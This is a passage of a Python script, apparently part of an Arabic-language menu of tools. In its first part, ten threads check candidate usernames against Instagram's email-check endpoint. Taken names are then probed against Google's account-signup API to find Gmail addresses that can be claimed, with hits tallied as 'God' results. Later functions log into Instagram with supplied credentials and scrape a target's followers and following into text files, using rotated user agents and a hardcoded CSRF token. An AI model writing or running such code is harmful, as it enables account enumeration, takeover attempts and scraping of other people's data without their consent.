        data = f'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{year}%2C{month}%2C{day}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Ce7dqt-8CAAYS9oQNMvaNI-E0kDL2R8b0ADQBEArZ1Ii0ewZerS_7PBbUbK96k4d-7EUxCP2CNXM6XGobK0PC7E4HshzM1i7q2FVJ94jazQAAAwedAAAAKqcBB7EATTRIdjiLSgfcYKbEmqvAUgvTdx47_HplH3SQ0tr7csO3cf_aXFTEVFv9kA1RjEYYe9qfVreYjX4nVaFxRkvoFij3x6CiWd_z9-QD6m1bVgaqUu8nJlmtfsAihcv-HolbkeE8dfLkxoQtSyA_uhBUsZFX6A56Ul-A2T4c__nyopEGMXYZbvo2yorCm1rfQhJqwnHJCLT5xAACQg0fFT_yvhQj_3WSPfDc7QANHJgxzcH6kdHY0n-U_U1gbi0eJ0B0hrq_BTWwcPrGQAhBIgJBkMsXgu3eo3Mdx0zXF_0rNfkpF_8HSycSWLNTR38PS__rB1LvS5P2YRtCRavP9byAZ-CN_roEhEc9Qx3OI_VWdUlCASoMYp3lX1TapTw-KcHNA481z5tGLY__Z5CdTUyHtqeEJcOI1pU0axO0q2ATMZXO0P9YdP9NlO5Qhdubh90ZaT1O3zmDPoGiHYZ8ol0qRsxKwDwsqh8OpxaIShfjura9MnJj0Rn3ZcW2Pbvmg2vjpGobqe7X5hwrjytE5WsYtZgoUSQFUgIgqCdKs70n_mDvItjF2fEGu0g9q7a6ozXJR2-ZTUxpbMIktze_ttp_rICWGXBo1N3VIz0fgRHKEfd1E--QQ4MV9n6Fl_EkhphO5fUJFGYitCK1OEBjZL3sG6TxUxwLzq5bZwT0_x3_w2iZZFWad4oaI9UiIgHs09PSj7O0oV1IZcaL2MxPlrSP4_oXpgb8WS_TeovMGaYNtERgJEkjywqOIQU86X-O5rySXn3_ZyFBBaBDRhhWtJ93_4TIUe7Xb6zrNOpH9lhFWPV8j9sD_f_78HwE1MMCVPZ4_Yb-YxPODcvpAyl7_LgxY0IbIuqntFiGdLH277Hgj2LdEf-GwSNXDONR8bgD_f8Hd2ynPWu6aiiXGqDAF6zqUSk_8gGYcPaVKvj-xR-Ay8eBeZg32brhuFiDbDbd-7aWuJ_qvP9F5CvIPbaMh1IMUuCq18Ek7zjxh4nRLs8oN_Bf4biSl5_-9A9svKzrS_BMqfC2GYmBkWyCaf50TJ8ImgAFdA3xSerzi5UTahcK6F3B7E2wuH8sUi-yEDi_VHX9zAatz8A8WFSuK_D1Fp6kHEMOXtDjI4iDZHIn-ytQGNeoJoKhTfoPlQ4vhDtzH1BP3RuqzuHyGxCvbwvclsl4rV4gEqcR7hxuzt6WRmn6KGP4UXncpZKi0SliLpPCQMLLtdUvZqUhaN9FYMkdp2AkVJC4qhmbYsQYQBGAzklyvjUCh4DoQs9mhl9HlSMjcpCV-OJkCKMcButOvDrD0nQuANzusT419Ox1oVgEsUMdErZfywBm7YDqGth1T97anpiAeFG_QeDabJzidbHSD6WRgqwFs4dJ9mv7M5HPg2xX5j10244kIbc5UQgL68TVClLj83QNdpSZZMu5kNREbjOs3NELDv4f2wVzI5cFQyld0PkGfsI4CgobzFXgkqcyKbvmi4TkmCH6jkzJK8bx986hQGjVdX31Gg9bexhNXD2wlohQQfQUwpxIKu2TLFT_TZyPMGAIlFw89NHAH-NXSa1oXuOY_zgH7T2ESNQ4P3DjkUGPOBxl6AyqEh2DkKbwvOhRP3Yo7ceAVMpwxKYjwmaHD6OmZhnNF603lgvuKPfjdIwgYL66EnYel7S5tY3MOHlTFeM29gMzh8nC86bTKZwxRf2KlT5b-8mGAbrEcggQXdZp7PBi5M5xw9KxboB_Jf_mpgoRBl-_tgsWiQil4VVWICp-QVB94lLM1UWwGBR34kb5IbDDbl7LE-9s1qGcNVGL6q6YLRiJjL1M-roVJSn-JZQEuzoG7pBceotln2l87YTtN2jTB0w_xBtzH_O8H18cwF0QMNWwO_F-AsM21hmKPNCFoctsTWdmiPR4D2py1MjaNZoQe499SxOUGsFyiUI-ij2B2HNB_5LWUUxA4i9M9hQXE2bN8jqYc-AWq9hauHIXfkin5JpUoEPuLa4xyL2dwUZYK1xrg8gWOGhW0o9dLvWewAhM12XFUyXVHvIjUdJgqX26T3wmIJW6AiEAhvWHyuhoDQQuUG30mJeeG4YLm2_LORmSa6QGmmPjXAkFt-mMcvVAep3AjteJTozNvKAXIp5kd35fyJtLgkMRP-J1IqhyneiuajBTvldAXxBZsh5SzmMamwzjnrOzZ-yD94odwwiBduS16F2yiz3N5-pOqklt3AiRTD13-CRniPl6MASfSujoX3XADBAJujd6eURxhbx-ef_RhxdbpucwtDc2tmaL9LFjHh-RUDROvHOS1dKKCH31TtrnwjOjYG-shDoYsF0zRl7cUVzMNdVOxQ_jB7ttmFeEWX2mgkDJ6M78DdwcyRvtYH2tb8uNOXXa5WQwvgmk7L7-Aa1Zn10%5C%22%2C%5Bnull%2Cnull%2C%5C%22http%3A%2F%2Fsupport.google.com%2Fmail%2Fanswer%2F56256%3Fhl%3Dar%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5C%22GAlAdQ%5C%22%5D%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'

        response = se.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
        )

        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'user-agent': str(ua()),
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CMbxygE=',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': f'["{xr}"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'f.sid': '8878106518468624430',
            'bl': 'boq_identity-account-creation-evolution-ui_20250319.07_p0',
            'hl': 'ar',
            'TL': TL,
            '_reqid': '1029653',
            'rt': 'c',
        }

        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C1%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C196219%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'

        re = se.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
        ).text
        if 'password' in re:
            GE += 1
            Info(email)
            os.system('clear')
            p(
                f'[green bold]God IN[yellow bold]:[green bold]{GN} [red bold]Bad EM[yellow bold]:[red bold]{BE} [green bold]God EM[yellow bold]:[green bold]{GE} [red bold]Bad IN[yellow bold]:[red bold]{BN}')
        else:
            BE += 1
            os.system('clear')
            p(
                f'[green bold]God IN[yellow bold]:[green bold]{GN} [red bold]Bad EM[yellow bold]:[red bold]{BE} [green bold]God EM[yellow bold]:[green bold]{GE} [red bold]Bad IN[yellow bold]:[red bold]{BN}')

    def instagram():
        global GN, BN, GE, BE
        emails = Check_List()
        for email in emails:
            crf = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/',
                                 ).cookies.get_dict()['csrftoken']
            he = {
                'user-agent': str(ua()),
                'x-csrftoken': crf,
                'x-ig-app-id': '936619743392459',
            }
            data = {
                'email': email + '@gmail.com',
            }
            res = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=he,
                                data=data,
                                ).text
            if "email_is_taken" in res:
                if '_' not in email:
                    if len(email) >= 6:
                        GN += 1
                        gmail(email)
                        os.system('clear')
                        p(
                            f'[green bold]God IN[yellow bold]:[green bold]{GN} [red bold]Bad EM[yellow bold]:[red bold]{BE} [green bold]God EM[yellow bold]:[green bold]{GE} [red bold]Bad IN[yellow bold]:[red bold]{BN}')
                    else:
                        pass
                else:
                    pass
            else:
                BN += 1
                os.system('clear')
                p(
                    f'[green bold]God IN[yellow bold]:[green bold]{GN} [red bold]Bad EM[yellow bold]:[red bold]{BE} [green bold]God EM[yellow bold]:[green bold]{GE} [red bold]Bad IN[yellow bold]:[red bold]{BN}')

    for i in range(10):
        Thread(target=instagram).start()


def Following():
    username = input(f'{W1}[{C1}+{W1}]{Y1}Enter Username:{R1}')
    password = input(f'{W1}[{C1}+{W1}]{Y1}Enter Password:{R1}')
    username_target = input(f'{W1}[{C1}+{W1}]{Y1}Enter User Target:{R1}')
    print(W1 + '-' * 20)

    def Get_list(Id, csrf, ds, seid):
        cookies = {
            'csrftoken': csrf,
            'sessionid': seid,
            'ds_user_id': ds,
        }

        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': f'https://www.instagram.com/{username_target}/following/',
            'user-agent': str(ua()),
            'x-csrftoken': csrf,
            'x-ig-app-id': '936619743392459',
        }
        max_id = None
        try:
            while True:
                params = {
                    'count': '12',
                }
                if max_id:
                    params['max_id'] = max_id
                response = requests.get(
                    f'https://www.instagram.com/api/v1/friendships/{Id}/following/',
                    params=params,
                    cookies=cookies,
                    headers=headers,
                ).json()
                if 'users' not in response:
                    print('[!]Erorr To Get Users', response)
                    break
                for user in response.get('users', []):
                    print(user['username'])
                    with open('ListFollowing.txt', 'a', encoding='utf-8') as Fo:
                        Fo.write(user['username'] + '\n')
                if 'next_max_id' in response and response['next_max_id']:
                    max_id = response['next_max_id']
                else:
                    p('[bold white on red]Done Get All Users')
                    break
        except Exception as e:
            print('Erorr:', str(e))

    def login(Id):
        crf = requests.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/').cookies.get_dict()['csrftoken']
        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'pragma': 'no-cache',
            'referer': 'https://www.instagram.com/',
            'user-agent': str(ua()),
            'x-csrftoken': crf,
            'x-ig-app-id': '936619743392459',
        }
        ti = str(time.time()).split('.')[0]
        data = {
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{ti}:{password}',
            'username': username,
        }
        res = requests.post(
            'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
            headers=headers,
            data=data,
        )
        if 'userId' in res.text:
            csrf = res.cookies.get_dict()['csrftoken']
            ds = res.cookies.get_dict()['ds_user_id']
            seid = res.cookies.get_dict()['sessionid']
            Get_list(Id, csrf, ds, seid)

        else:
            print(res.text)

    def info_target():
        headers = {
            'user-agent': str(ua()),
            'x-csrftoken': 'znk9dtIIOHMFI5pVbgsRQPpbcz9CVqr9',
            'x-ig-app-id': '936619743392459',
        }

        params = {
            'username': username_target,
        }

        re = requests.get(
            'https://www.instagram.com/api/v1/users/web_profile_info/',
            params=params,
            headers=headers,
        ).json()
        try:
            Id = re['data']['user']['id']
            status = re.get('data', {}).get('user').get('is_private', False)
            if status:
                p('[bold white on red]Account Is Private')
                exit()
            else:
                login(Id)
        except:
            rs = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
            ).cookies.get_dict()['csrftoken']
            headers['x-csrftoken'] = rs
            info_target()

    info_target()


def Followers():
    username = input(f'{W1}[{C1}+{W1}]{Y1}Enter Username:{R1}')
    password = input(f'{W1}[{C1}+{W1}]{Y1}Enter Password:{R1}')
    username_target = input(f'{W1}[{C1}+{W1}]{Y1}Enter User Target:{R1}')
    print(W1 + '-' * 20)

    def Get_List(Id, csrf, ds, seid):
        cookies = {
            'sessionid': seid,
            'csrftoken': csrf,
            'ds_user_id': ds,
        }

        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'referer': f'https://www.instagram.com/{username_target}/followers/',
            'user-agent': str(ua()),
            'x-csrftoken': csrf,
            'x-ig-app-id': '936619743392459',
        }

        max_id = None
        try:
            while True:
                params = {'count': '12'}
                if max_id:
                    params['max_id'] = max_id
                response = requests.get(
                    f'https://www.instagram.com/api/v1/friendships/{Id}/followers/',
                    headers=headers,
                    cookies=cookies,
                    params=params
                ).json()
                if 'users' not in response:
                    print('[!]Erorr To Get Users', response)
                    break

                for user in response.get('users', []):
                    print(user['username'])
                    with open('ListFollowers.txt', 'a', encoding="utf-8") as Fo:
                        Fo.write(user['username'] + '\n')
                if 'next_max_id' in response and response['next_max_id']:
                    max_id = response['next_max_id']
                else:
                    p('[bold white on red]Done Get All Users')
                    break
        except Exception as e:
            print('Erorr:', str(e))

    def login(Id):
        crf = requests.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/').cookies.get_dict()['csrftoken']
        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'pragma': 'no-cache',
            'referer': 'https://www.instagram.com/',
            'user-agent': str(ua()),
            'x-csrftoken': crf,
            'x-ig-app-id': '936619743392459',
        }
        ti = str(time.time()).split('.')[0]
        data = {
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{ti}:{password}',
            'username': username,
        }
        res = requests.post(
            'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
            headers=headers,
            data=data,
        )
        if "userId" in res.text:
            csrf = res.cookies.get_dict()['csrftoken']
            ds = res.cookies.get_dict()['ds_user_id']
            seid = res.cookies.get_dict()['sessionid']
            Get_List(Id, csrf, ds, seid)

        else:
            print(res.text)

    def info_target():
        headers = {
            'user-agent': str(ua()),
            'x-csrftoken': 'znk9dtIIOHMFI5pVbgsRQPpbcz9CVqr9',
            'x-ig-app-id': '936619743392459',
        }

        params = {
            'username': username_target,
        }

        re = requests.get(
            'https://www.instagram.com/api/v1/users/web_profile_info/',
            params=params,
            headers=headers,
        ).json()
        try:
            Id = re['data']['user']['id']
            status = re.get('data', {}).get('user').get('is_private', False)
            if status:
                p(f'[bold white on red][!]account is private:{username_target}')
                exit()
            else:
                login(Id)
        except:
            rs = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
            ).cookies.get_dict()['csrftoken']
            headers['x-csrftoken'] = rs
            info_target()

    info_target()


tools()